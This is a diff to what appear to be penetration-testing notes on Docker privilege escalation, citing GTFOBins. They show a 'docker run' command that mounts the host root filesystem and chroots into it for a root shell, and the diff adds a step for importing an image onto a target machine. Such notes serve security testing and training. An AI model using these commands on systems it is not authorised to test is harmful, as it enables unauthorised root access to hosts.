@@ -17,3 +17,7 @@ Link: https://gtfobins.github.io/gtfobins/docker/
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 ## TIP: If there are no images on the machine, you can import one yourself and use this to achieve root!
+
+Transfer the image to the target machine, then run
+
+    docker image import alpine.tar.gz
